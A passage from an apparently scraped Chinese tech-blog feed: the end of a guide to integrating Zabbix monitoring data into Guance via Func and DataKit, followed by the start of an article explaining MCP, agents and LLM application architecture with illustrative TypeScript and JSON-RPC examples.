<p>1、使用 Func 创建一个脚本用于组装 reference table 数据，并发布。数据结构类似于：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
<span class="hljs-attr">"table_name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"zabbix-refer-table"</span><span class="hljs-punctuation">,</span>
<span class="hljs-attr">"column_name"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"itemid"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"host"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"ip"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"itemkey"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
<span class="hljs-attr">"column_type"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"string"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"string"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"string"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"string"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
<span class="hljs-attr">"row_data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-string">"1001"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"host-1"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"10.0.0.1"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"vfs.fs.size"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> 
    <span class="hljs-punctuation">[</span><span class="hljs-string">"1002"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"host-2"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"10.0.0.2"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"vfs.fs.size.pused"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> 
    <span class="hljs-punctuation">[</span><span class="hljs-string">"1003"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"host-3"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"10.0.0.3"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"vfs.fs.size.pfree"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>更多 reference table 用法，可参考：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.guance.com%2Fdatakit%2Fdatakit-refer-table%2F" target="_blank" title="https://docs.guance.com/datakit/datakit-refer-table/" ref="nofollow noopener noreferrer">docs.guance.com/datakit/dat…</a></p>
<p>2、创建同步 API</p>
<p>登录 Func，点击「管理」 - 「同步 API」，点击 新建，在添加同步 API 对话框执行一栏中选择 zabbix-reference-table 获取脚本，点击确定保存脚本，并点击示例，获取请求 API。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65f857d7aa7645e8b370dbf294149ca5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=YGfGlgzxaGc1%2BXXCU6iSm24vmj0%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9bed20543834c0ca47ae71f7ba07969~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=Xv8hlJmQnry4ZGIm7EkTG5Ap7mg%3D" alt="" loading="lazy"/></p>
<p>3、编辑 DataKit 的配置文件</p>
<p>登录 DataKit 所在服务器（容器部署DataKit 参考官方文档），进入 DataKit 配置目录 <code>/user/local/datakit/conf.d</code>，编辑 <code>datakit.conf</code> 文件，修改 <code>[pipeline]</code> 选项下的 <code>refer_table_url</code> 的值为上一步复制的 Func 接口地址。DataKit 会将 refertable 数据预先加载到本地的 sqllite 中，可以根据 refer table 大小灵活选择是否使用内存模式的 sqllite。保存后重启 DataKit 生效。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4fa789e5bf34d86910dadaabae7afb6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=Gldo%2BCUnpfFZvt%2FQb8sTNaxUC3A%3D" alt="" loading="lazy"/></p>
<p>4、编辑 Pipeline</p>
<p>登录观测云，点击「管理」 - 「Pipelines」- 「新建 Pipeline」，这里给到一个参考 Pipeline，可根据实际业务情况和 refertable 数据结构灵活调整。</p>
<p>5、查看指标 Tag</p>
<h3 data-id="heading-16">超大数据量采集优化策略</h3>
<ul>
<li>对于 Export Directory 方式，可以增加独立的高速 SSD 磁盘，增加单独的 zabbix server 用于数据导出（由于需要访问 zabbix API 和数据库，DataKit 采集 ExportDirectory 会比较占用 zabbix 资源）。调低 ExportFileSize 大小。</li>
<li>API 采集方式，可以通过分页查询，减少查询关联表，多线程查询等方式。</li>
<li>HTTP stream 方式，可以引入队列进行异步消费或使用异步方法。支持采样收集等方式。</li>
<li>指标治理应先将映射关系生成后存入缓存或内存中，方便快速匹配。为减少 redis 读写压力可以考虑分片缓存或缓存压缩等方法。</li>
</ul>
<h3 data-id="heading-17">各采集方式对比</h3>





























<table><thead><tr><th>采集方式</th><th>采集原理</th><th>优势</th><th>劣势</th></tr></thead><tbody><tr><td>Zabbix API</td><td>func/datakit使用python代码通过zabbix api获取指标数据。进行指标治理和映射后上传到观测云。</td><td>可分布式采集，采集过程高可用便于灵活调整采集所需资源。便于指标的灵活治理和映射</td><td>时效性不高，最大时延可达1minzabbix到func区间数据无法压缩，对该区间网路压力较大。通常需要在func维护采集代码，对采集代码质量要求较高，否则在进行大数据量采集时速度较慢导致时效变差或丢失数据，严重时会影响zabbix性能。</td></tr><tr><td>Streaming</td><td>与zabbix建立网络长连接（HTTP server/Kafka）消费zabbix产生的history和event数据</td><td>时效性高可分布式采集，采集过程高可用便于灵活调整采集所需资源。便于指标的灵活治理和映射</td><td>zabbix到func区间数据无法压缩，对该区间网路压力较大。</td></tr><tr><td>Zabbix 转 Prometheus</td><td>部署独立服务通过调用zabbix api将zabbix指标数据暴露成Prometheus metric接口供datakit采集</td><td>集成简单，可以使用datakit现有能力。</td><td>需要维护独立的转换服务。转换服务与zabbix间网络转发无压缩，对网络压力较大。无法灵活进行指标治理和映射。</td></tr></tbody></table>
<h2 data-id="heading-18">总结</h2>
<p>监控数据的集成是一个复杂的综合性工作，本文所展示方案所适用场景需相关运维工程师根据实际情况进行调整。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MCP、Agent、大模型应用架构解读]]></title>    <link>https://juejin.cn/post/7596998306381758514</link>    <guid>https://juejin.cn/post/7596998306381758514</guid>    <pubDate>2026-01-20T09:58:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596998306381758514" data-draft-id="7597125475601416219" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MCP、Agent、大模型应用架构解读"/> <meta itemprop="keywords" content="前端,架构,AI编程"/> <meta itemprop="datePublished" content="2026-01-20T09:58:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sorryhc"/> <meta itemprop="url" content="https://juejin.cn/user/3061476130044487"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MCP、Agent、大模型应用架构解读
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3061476130044487/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sorryhc
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T09:58:22.000Z" title="Tue Jan 20 2026 09:58:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    25
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言</h3>
<p>随着大语言模型(LLM)的快速发展，如何让 AI 能够有效地与外部世界交互，已成为 AI 应用开发的核心课题。Anthropic 推出的 MCP(Model Context Protocol)、智能代理(Agent)和大模型应用三者的结合，形成了一套完整的 AI 系统架构。</p>
<p>接下来，我们深入解读这三个核心概念及其相互关系。</p>
<hr/>
<h3 data-id="heading-1">一、3个核心概念的定义</h3>
<h4 data-id="heading-2">1.1 大模型应用(AI Application)</h4>
<p>大模型应用是整个系统的最外层容器。它包括：</p>
<ul>
<li>应用程序框架和生命周期管理</li>
<li>用户交互界面(CLI、Web、API等)</li>
<li>系统配置和资源管理</li>
<li>外部集成(数据库、监控等)</li>
</ul>
<pre><code class="hljs">大模型应用
  ├─ 启动应用
  ├─ 管理配置
  ├─ 处理用户输入
  ├─ 返回处理结果
  └─ 关闭应用
</code></pre>
<h4 data-id="heading-3">1.2 Agent(智能代理)</h4>
<p>Agent 是大模型应用的大脑和执行引擎。它的职责是：</p>
<ul>
<li>理解用户意图(通过大模型)</li>
<li>规划执行步骤</li>
<li>决定调用什么工具</li>
<li>处理工具执行结果</li>
<li>持续优化和迭代</li>
</ul>
<p>Agent 的核心价值在于将大模型的推理能力与外部工具执行能力结合。</p>
<h4 data-id="heading-4">1.3 MCP(Model Context Protocol)</h4>
<p>MCP 是一个开放的通信协议规范。它定义了：</p>
<ul>
<li>工具的统一调用接口</li>
<li>消息的标准格式(JSON-RPC 2.0)</li>
<li>服务的发现和注册机制</li>
<li>错误处理规范</li>
</ul>
<p>MCP 的核心价值在于解耦工具调用的复杂性，实现工具即插即用。</p>
<hr/>
<h3 data-id="heading-5">二、三者的包含关系</h3>
<pre><code class="hljs language-scss" lang="scss">┌──────────────────────────────────────────────────┐
│                 大模型应用                        │
│                                                  │
│  ┌────────────────────────────────────────────┐ │
│  │              Agent                         │ │
│  │                                            │ │
│  │  ├─ 初始化 MCP (建立连接、获取工具)       │ │
│  │  ├─ 与大模型交互 (发送提示词、接收响应)  │ │
│  │  ├─ 解析大模型输出 (识别工具调用)        │ │
│  │  ├─ 通过 MCP 调用工具 (执行具体任务)     │ │
│  │  ├─ 处理工具结果 (反馈给大模型)          │ │
│  │  └─ 循环迭代 (直到任务完成)              │ │
│  │                                            │ │
│  │         ◄──────────────────────►          │ │
│  │            MCP (工具协议)                  │ │
│  │         ◄──────────────────────►          │ │
│  │                                            │ │
│  └────────────────────────────────────────────┘ │
│                                                  │
│  用户输入  ──►  应用处理  ──►  用户输出        │
│                                                  │
└──────────────────────────────────────────────────┘
</code></pre>
<hr/>
<h3 data-id="heading-6">三、工作流程详解</h3>
<h4 data-id="heading-7">3.1 初始化阶段</h4>
<pre><code class="hljs language-arduino" lang="arduino">第一步：读取配置文件(mcp.json)
  ├─ 检查有哪些 MCP <span class="hljs-built_in">Server</span>
  ├─ 验证配置的合法性
  └─ 记录工具来源信息

第二步：连接所有 MCP <span class="hljs-built_in">Server</span>
  ├─ 为每个 <span class="hljs-built_in">Server</span> 创建 MCP <span class="hljs-built_in">Client</span>
  ├─ 建立传输连接(stdio/HTTP/WebSocket)
  ├─ 发送 initialize 信息握手
  └─ 获取 <span class="hljs-built_in">Server</span> 能力信息

第三步：获取所有工具列表
  ├─ 从每个 <span class="hljs-built_in">Server</span> 调用 <span class="hljs-built_in">listTools</span>()
  ├─ 收集返回的工具定义
  ├─ 合并工具列表并检查冲突
  └─ 标记每个工具来自哪个 <span class="hljs-built_in">Server</span>

第四步：准备就绪
  └─ Agent 获得完整的工具清单，可以开始工作
</code></pre>
<p>代码示例：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AIApplication</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">agent</span>: <span class="hljs-title class_">Agent</span>
  
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// Agent 初始化</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">agent</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Agent</span>(<span class="hljs-string">"mcp.json"</span>)
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">agent</span>.<span class="hljs-title function_">initialize</span>()
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"✓ 应用初始化完成"</span>)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`✓ 可用工具数: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.agent.toolCount}</span>`</span>)
  }
}
</code></pre>
<h4 data-id="heading-8">3.2 处理请求阶段</h4>
<p>当用户输入一个请求时，完整的处理流程如下：</p>
<pre><code class="hljs language-arduino" lang="arduino">用户输入: <span class="hljs-string">"帮我计算 (10 + 5) * 2 的结果"</span>
  │
  ▼
┌─────────────────────────────────────────┐
│  Agent 第一步：准备提示词                 │
│  ├─ 获取当前的工具列表                   │
│  ├─ 组织成 Claude 能理解的格式          │
│  └─ 加入用户的原始请求                   │
└──────────────┬──────────────────────────┘
               │
  ┌────────────▼─────────────┐
  │  Claude API              │
  │  (处理用户请求)          │
  │  ├─ 理解用户意图         │
  │  ├─ 规划执行步骤         │
  │  └─ 决定调用哪些工具     │
  │                          │
  │  Claude 响应:            │
  │  <span class="hljs-string">"我需要先调用 add(10,5)"</span>│
  └────────────┬─────────────┘
               │
  ┌────────────▼──────────────────────┐
  │  Agent 第二步：处理工具调用请求     │
  │  ├─ 解析 Claude 的响应             │
  │  ├─ 识别出要调用 <span class="hljs-string">"add"</span> 工具        │
  │  ├─ 找到 <span class="hljs-string">"add"</span> 来自哪个 <span class="hljs-built_in">Server</span>    │
  │  └─ 获取该 <span class="hljs-built_in">Server</span> 的 MCP <span class="hljs-built_in">Client</span>    │
  └────────────┬──────────────────────┘
               │
  ┌────────────▼──────────────────────┐
  │  Agent 第三步：通过 MCP 调用工具    │
  │  ├─ 构建标准化的 RPC 请求          │
  │  ├─ 调用: client.<span class="hljs-built_in">callTool</span>(<span class="hljs-string">"add"</span>,   │
  │  │         {a: <span class="hljs-number">10</span>, b: <span class="hljs-number">5</span>})         │
  │  └─ 等待工具执行完毕               │
  └────────────┬──────────────────────┘
               │
  ┌────────────▼──────────────────────┐
  │  <span class="hljs-function">MCP <span class="hljs-title">Server</span> <span class="hljs-params">(实际执行工具)</span>         │
  │  ├─ 接收 RPC 请求                  │
  │  ├─ 执行: <span class="hljs-number">10</span> + <span class="hljs-number">5</span> =</span> <span class="hljs-number">15</span>             │
  │  └─ 返回结果: {result: <span class="hljs-number">15</span>}        │
  └────────────┬──────────────────────┘
               │
  ┌────────────▼──────────────────────┐
  │  Agent 第四步：反馈给 Claude        │
  │  ├─ 把结果添加到对话历史           │
  │  ├─ <span class="hljs-string">"add(10, 5) 的结果是 15"</span>      │
  │  └─ 重新调用 Claude               │
  └────────────┬──────────────────────┘
               │
  ┌────────────▼──────────────────────┐
  │  Claude 继续推理                  │
  │  ├─ 看到了第一步的结果             │
  │  ├─ 继续规划下一步                 │
  │  └─ <span class="hljs-string">"现在我需要调用 multiply(15,2)"</span>│
  └────────────┬──────────────────────┘
               │
  (重复步骤 <span class="hljs-number">2</span><span class="hljs-number">-4</span> 直到 Claude 说完成)
               │
  ┌────────────▼──────────────────────┐
  │  Claude 最终响应                   │
  │  ├─ stop_reason = <span class="hljs-string">"end_turn"</span>      │
  │  ├─ content = <span class="hljs-string">"答案是 30"</span>         │
  │  └─ Agent 停止循环                 │
  └────────────┬──────────────────────┘
               │
               ▼
        返回用户: <span class="hljs-string">"答案是 30"</span>
</code></pre>
<h4 data-id="heading-9">3.3 循环机制的关键</h4>
<p>Agent 的循环处理是理解整个架构的关键：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-title function_">process</span>(<span class="hljs-attr">userInput</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt; {
  <span class="hljs-keyword">let</span> messages = [{ <span class="hljs-attr">role</span>: <span class="hljs-string">"user"</span>, <span class="hljs-attr">content</span>: userInput }]
  
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> iteration = <span class="hljs-number">0</span>; iteration &lt; maxIterations; iteration++) {
    <span class="hljs-comment">// 1. 调用 Claude</span>
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> claude.<span class="hljs-property">messages</span>.<span class="hljs-title function_">create</span>({
      messages,
      <span class="hljs-attr">tools</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">tools</span>  <span class="hljs-comment">// 传递所有可用工具</span>
    })
    
    <span class="hljs-comment">// 2. 添加 Claude 的响应到历史</span>
    messages.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">role</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-attr">content</span>: response.<span class="hljs-property">content</span> })
    
    <span class="hljs-comment">// 3. 检查 Claude 是否完成</span>
    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">stop_reason</span> === <span class="hljs-string">"end_turn"</span>) {
      <span class="hljs-comment">// Claude 完成了，返回最终答案</span>
      <span class="hljs-keyword">const</span> textBlock = response.<span class="hljs-property">content</span>.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">b</span> =&gt;</span> b.<span class="hljs-property">type</span> === <span class="hljs-string">"text"</span>)
      <span class="hljs-keyword">return</span> textBlock.<span class="hljs-property">text</span>
    }
    
    <span class="hljs-comment">// 4. Claude 要求调用工具</span>
    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">stop_reason</span> === <span class="hljs-string">"tool_use"</span>) {

      <span class="hljs-keyword">const</span> toolResults = [ ]

      
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> block <span class="hljs-keyword">of</span> response.<span class="hljs-property">content</span>) {
        <span class="hljs-keyword">if</span> (block.<span class="hljs-property">type</span> === <span class="hljs-string">"tool_use"</span>) {
          <span class="hljs-comment">// 通过 MCP 调用工具</span>
          <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callToolViaMCP</span>(
            block.<span class="hljs-property">name</span>,
            block.<span class="hljs-property">input</span>
          )
          
          toolResults.<span class="hljs-title function_">push</span>({
            <span class="hljs-attr">type</span>: <span class="hljs-string">"tool_result"</span>,
            <span class="hljs-attr">tool_use_id</span>: block.<span class="hljs-property">id</span>,
            <span class="hljs-attr">content</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(result)
          })
        }
      }
      
      <span class="hljs-comment">// 5. 把工具结果添加到历史（关键！Claude 需要看到结果）</span>
      messages.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">role</span>: <span class="hljs-string">"user"</span>,
        <span class="hljs-attr">content</span>: toolResults
      })
      
      <span class="hljs-comment">// 循环回第 1 步，Claude 基于工具结果继续推理</span>
    }
  }
}
</code></pre>
<p>关键点：</p>
<ul>
<li><code>messages</code> 数组是"记忆"，不断积累</li>
<li>每次调用 Claude 时，都传递完整的历史</li>
<li>Claude 基于之前的工具执行结果进行下一步决策</li>
</ul>
<hr/>
<h3 data-id="heading-10">四、MCP 的泛化调用设计</h3>
<h4 data-id="heading-11">4.1 为什么需要泛化？</h4>
<p>不泛化的方式（混乱）：</p>
<pre><code class="hljs language-ini" lang="ini">// 需要为每个工具写特定代码
if (<span class="hljs-attr">toolName</span> === <span class="hljs-string">"add"</span>) {
  <span class="hljs-attr">result</span> = calculator.add(args.a, args.b)
} else if (<span class="hljs-attr">toolName</span> === <span class="hljs-string">"query"</span>) {
  <span class="hljs-attr">result</span> = database.query(args.sql)
} else if (<span class="hljs-attr">toolName</span> === <span class="hljs-string">"analyzeCode"</span>) {
  <span class="hljs-attr">result</span> = codeAnalyzer.analyze(args.code)
}
// ... 100+ 个 else if ...

// 问题：新增工具时要改应用代码
</code></pre>
<p>泛化的方式（MCP）：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 一个函数搞定所有工具</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-keyword">this</span>.callToolViaMCP(toolName, args)

<span class="hljs-comment">// 问题解决：新增工具时只需改配置</span>
</code></pre>
<h4 data-id="heading-12">4.2 泛化的实现原理</h4>
<pre><code class="hljs language-scss" lang="scss">┌──────────────────────────────────────────┐
│   统一的工具调用接口                      │
│   <span class="hljs-built_in">callTool</span>(name: string, args: any)      │
└──────────────┬───────────────────────────┘
               │
      ┌────────┴────────┐
      │                 │
      ▼                 ▼
  ┌────────┐      ┌──────────┐
  │ Server │      │ Server   │
  │ <span class="hljs-selector-tag">A</span>      │      │ <span class="hljs-selector-tag">B</span>        │
  │        │      │          │
  │ add    │      │ query    │
  │ sub    │      │ insert   │
  └────────┘      └──────────┘

所有 Server 遵守相同的 MCP 规范：
  ├─ 都支持 <span class="hljs-built_in">listTools</span>() 方法
  ├─ 都支持 <span class="hljs-built_in">callTool</span>(name, args) 调用
  ├─ 都返回标准格式的结果
  └─ 应用无需关心 Server 差异
</code></pre>
<h4 data-id="heading-13">4.3 MCP 规范的约束</h4>
<p>MCP 定义了统一的消息格式：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// 工具列表请求</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"jsonrpc"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"method"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tools/list"</span>
<span class="hljs-punctuation">}</span>

<span class="hljs-comment">// 工具列表响应</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"jsonrpc"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"result"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"tools"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"add"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Add two numbers"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"inputSchema"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"object"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"properties"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"number"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
